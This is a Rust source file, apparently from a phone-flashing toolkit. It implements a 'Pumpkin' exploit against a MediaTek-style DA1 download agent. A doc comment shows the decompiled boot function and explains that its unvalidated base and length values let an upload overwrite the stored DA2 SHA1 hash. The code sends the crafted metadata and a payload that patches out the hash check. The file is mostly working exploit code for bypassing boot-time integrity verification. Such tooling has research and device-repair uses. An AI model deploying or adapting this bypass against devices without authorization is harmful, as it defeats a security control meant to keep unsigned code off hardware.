use crate::{
    err::Error,
    exploit::{Exploit, boot_da2, cmp, find},
};
use da_patcher::Disassembler;
use da_port::{SimpleRead, SimpleWrite};
use derive_ctor::ctor;
use sha1::{Digest, Sha1};

/// DA1 hash overwrite
///
/// ### How it works?
/// The boot function looks like this (with functions and variables renamed for readability):
/// ```c
/// int boot()
/// {
///   int (*base)(void); // r5
///   int len; // r9
///   int chunk_size; // r6
///   unsigned int n; // r4
///   __int64 chunk_n; // kr00_8
///   char *addr; // r0
///   unsigned int i; // r0
///   unsigned int j; // r4
///   _BYTE sha1_struct[56]; // [sp+0h] [bp-38h] BYREF
///
///   base = (int (*)(void))MEMORY[0x2017AFC]();
///   len = MEMORY[0x2017AFC]();
///   chunk_size = MEMORY[0x2017AFC]();
///   MEMORY[0x2017AE8](90);
///   printf("LoadDAToDRAM(), base=0x%x, length=0x%x\n", base, len);
///   n = 0;
///   chunk_n = div(len, chunk_size);
///   while ( 1 )
///   {
///     addr = (char *)base + n * chunk_size;
///     if ( n >= (unsigned int)chunk_n )
///       break;
///     MEMORY[0x2017AE4](addr, chunk_size);
///     MEMORY[0x2017AE8](90);
///     ++n;
///   }
///   MEMORY[0x2017AE4](addr, HIDWORD(chunk_n));
///   MEMORY[0x2017AE8](90);
///   sub_20155C0((int)sha1_struct, 0, 20);
///   sub_20103EE((int)base, len - 256, (int)sha1_struct);
///   for ( i = 0; i < 0x14; ++i )
///   {
///     if ( byte_2016478[i] != (unsigned __int8)sha1_struct[i] )
///     {
///       printf("Hash value mismatch! DA will Halt!\n");
///       for ( j = 0; j < 0x14; ++j )
///         printf("%x: %x %x\n", j, byte_2016478[j], (unsigned __int8)sha1_struct[j]);
///       while ( 1 )
///         ;
///     }
///   }
///   printf("LoadDAToDRAM(), verify pass and jump to DRAM\n\n=========================================\n");
///   return base();
/// }
/// ```
///
/// And the interesting part that the `base` and `len` are never validated, thus we can send payload anywhere.
///
/// The pumpkin sends the payload near to the hash value, overwriting it with valid metadata and payload hash, then payload patches hash check and jumps back to this function.
///
/// ##### I probably could've made it smaller... but if it works, it worksâ„¢
#[derive(ctor)]
pub struct Pumpkin<'a> {
    da1: &'a [u8],
    da2: &'a [u8],
    payload: &'a [u8],
    da1_base: u32,
}

impl Exploit for Pumpkin<'_> {
    fn run(&self, port: &mut da_port::Port) -> crate::Result<()> {
        let mut hasher = Sha1::new();
        hasher.update(&self.da2[..self.da2.len() - 256]);
        let hash = hasher.finalize();

        let offset = (0..self.da1.len())
            .find(|&i| self.da1[i..].starts_with(&hash))
            .ok_or(Error::Custom("da2 hash not found :(".into()))?;

        // + 20 for hash end
        // - 256 for ignored area
        // - 16 for metadata
        port.write_u32_be(
            self.da1_base + offset as u32 + 20 - 256 - 16 - self.payload.len() as u32,
        )?;
        port.write_u32_be(self.payload.len() as u32 + 256 + 16)?;
        port.write_u32_be(self.payload.len() as u32 + 256 + 16)?;
        port.read_u8()?; // Always ok

        // This is a bit cursed here, because we need to hash metadata too...
        let disasm = Disassembler::try_new()?;
        // Jump address, the function to boot da2
        let boot_function = ((boot_da2(&disasm, self.da1)? + self.da1_base) | 1).to_le_bytes();

        // Croissant2 original function, we don't need it here
        let original_function = 0u32.to_le_bytes();

        // Croissant2 pointer, we use it as mode switch too
        let mode = (b'p' as u32).to_le_bytes();

        // `cmp` instruction address
        let patch_address = (cmp(&disasm, self.da1)? + self.da1_base).to_le_bytes();

        let payload = [
            &boot_function,
            &original_function,
            &mode,
            &patch_address,
            self.payload,
        ]
        .into_iter()
        .flatten()
        .map(|u| *u)
        .collect::<Vec<_>>();

        port.write_all(&payload)?;

        let mut hasher = Sha1::new();
        hasher.update(&payload);
        let hash = hasher.finalize();

        port.write_all(&[0; 256 - 20])?;
        port.write_all(&hash)?;
        port.read_u8()?;
        port.read_u8()?;

        Ok(())
    }
}
